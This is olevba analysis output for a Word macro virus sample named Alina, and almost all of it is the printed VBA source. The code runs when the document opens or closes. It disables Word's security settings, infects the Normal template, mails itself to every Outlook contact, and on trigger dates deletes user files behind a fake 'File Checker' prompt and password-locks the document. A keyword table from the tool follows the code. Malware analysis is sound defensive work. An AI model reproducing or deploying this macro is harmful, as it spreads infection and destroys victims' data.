olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alina-a7597f8e8e7a299fe3272a922b700ef53e3a93f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lutfur.cls 
in file: Virus.MSWord.Alina-a7597f8e8e7a299fe3272a922b700ef53e3a93f1 - OLE stream: 'Macros/VBA/Lutfur'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Call Alina
End Sub
Private Sub Document_Open()
Call Alina
End Sub
Private Sub Alina()
On Error Resume Next
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
CustomizationContext = NormalTemplate
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Fateha" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Fateha"
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "Fateha/Alina/Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Fateha/Alina/Liton"
End If
Set ADC1 = ActiveDocument.VBProject.VBComponents(1)
Set NDC1 = NormalTemplate.VBProject.VBComponents(1)
ExportFile1 = Application.StartupPath + "\~Alina.tmp"
ExportFile2 = Application.StartupPath + "\~Love.tmp"
If Dir(ExportFile1) = "~Alina.tmp" Then Kill ExportFile1
If Dir(ExportFile2) = "~Love.tmp" Then Kill ExportFile2
If ADC1.CodeModule.CountOfLines > 0 Then ADC1.Export (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then NDC1.Export (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For i = 1 To ADC1.CodeModule.CountOfLines: ADC1.CodeModule.DeleteLines 1: Next
End If
ADC1.CodeModule.AddFromFile (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For i = 1 To 4: ADC1.CodeModule.DeleteLines 1: Next
Else
ADC1.CodeModule.AddFromFile (ExportFile1)
For i = 1 To 4: ADC1.CodeModule.DeleteLines 1: Next: End If
If NDC1.CodeModule.CountOfLines > 0 Then
For i = 1 To NDC1.CodeModule.CountOfLines
NDC1.CodeModule.DeleteLines 1: Next
End If
NDC1.CodeModule.AddFromFile (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then
For i = 1 To 4: NDC1.CodeModule.DeleteLines 1: Next
Else
NDC1.CodeModule.AddFromFile (ExportFile2)
For i = 1 To 4: NDC1.CodeModule.DeleteLines 1: Next
End If
If NDC1.Name <> "Love" Then NDC1.Name = "Love"

If Day(Now) > 0 And Day(Now) < 8 Then
If ADC1.Name <> "Love" Then
ADC1.Name = "Love"
Application.UserAddress = "Liton" + Chr(13) + "Shibrampur" + Chr(13) + "Burichang" + Chr(13) + "Comilla"
End If
End If
If Day(Now) >= 7 And Day(Now) < 16 Then
If ADC1.Name <> "Jhuma" Then
ADC1.Name = "Jhuma"
Application.UserAddress = "Jhuma" + Chr(13) + "Shibrampur" + Chr(13) + "Burichang" + Chr(13) + "Comilla"
End If
End If
If Day(Now) >= 15 And Day(Now) < 22 Then
If ADC1.Name <> "Love" Then
ADC1.Name = "Love"
Application.UserAddress = "Fateha" + Chr(13) + "Shibrampur" + Chr(13) + "Burichang" + Chr(13) + "Comilla"
End If
End If
If Day(Now) >= 21 And Day(Now) < 31 Then
If ADC1.Name <> "Lutfur" Then
ADC1.Name = "Lutfur"
Application.UserAddress = "Lutfur" + Chr(13) + "Shibrampur" + Chr(13) + "Burichang" + Chr(13) + "Comilla"
End If
End If
Dim UDO, DMN, BUOS
Set UDO = CreateObject("Outlook.Application")
Set DMN = UDO.GetNameSpace("MAPI")
DMN.Logon "profile", "password"
For l = DMN.AddressLists.Count To 1 Step -1
Set ADB = DMN.AddressLists(l)
i = 0
Set BUOS = UDO.CreateItem(0)
For t = ADB.AdressEntries.Count To 1 Step -1
o = ADB.AddressEntries(i)
BUOS.Recipients.Add o
i = i + 1
If i = ADB.AddressEntries.Count Then
t = 1
End If
Next t
BUOS.Subject = "Important News From Alina Via" + Application.UserName
BUOS.Body = "News of today:="
BUOS.Attachments.Add ActiveDocument.FullName
BUOS.Send
o = ""
Next l
DMN.Logoff
If WeekDay(Now) = Month(Now) Then
TargetPath = "c:\"
DirName = Dir(TargetPath, vbDirectory)
Dim FN(5)
N = 0
Do While DirName <> ""
If DirName <> "." And DirName <> ".." Then
If (GetAttr(TargetPath & DirName) And vbDirectory) = vbDirectory Then
With Application.FileSearch
.SearchSubFolders = True
.LookIn = "C:\" + DirName: .FileName = "*.*"
If .Execute() > 0 Then
For i = 1 To .FoundFiles.Count
If N <= 5 Then
FN(N) = .FoundFiles(i)
N = N + 1
i = .FoundFiles.Count
End If
Next i
End If
End With
End If
End If
DirName = Dir
Loop
FNames = ""
For i = 0 To 5
If FN(i) <> "" Then
FNames = FNames + FN(i) + Chr(13)
End If
Next
MsgBox "Following files are corrupted:" + Chr(13) + Chr(10) + FNames + "Press OK to correct this problem.", vbOKOnly + vbInformation, "File Checker"
For i = 0 To 5
If FN(i) <> "" Then
Kill FN(i)
End If
Next
End If
If Day(Now) = Month(Now) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Password:="Alina"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

